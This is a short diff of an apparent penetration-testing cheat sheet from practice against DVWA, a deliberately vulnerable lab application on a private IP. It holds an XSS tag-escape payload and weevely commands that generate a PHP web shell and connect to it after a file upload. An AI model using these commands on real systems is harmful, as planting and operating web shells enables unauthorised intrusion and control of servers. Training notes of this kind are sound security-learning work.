@@ -91,10 +91,11 @@ sudo openvpn nmap -sV {target IP}
 </whatever tag><whatever tag>alert(1)</whatever tag>
 [backlash and closing tag escape]
 
-weevely generate (any_passwd) /storage_path/file_name.php
+#File upload vulnerability 
+[+] weevely generate (any_passwd) /storage_path/file_name.php
 [generate php shell]
 
-weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
+[+]weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 [listen for backdoor connection]
 
 200
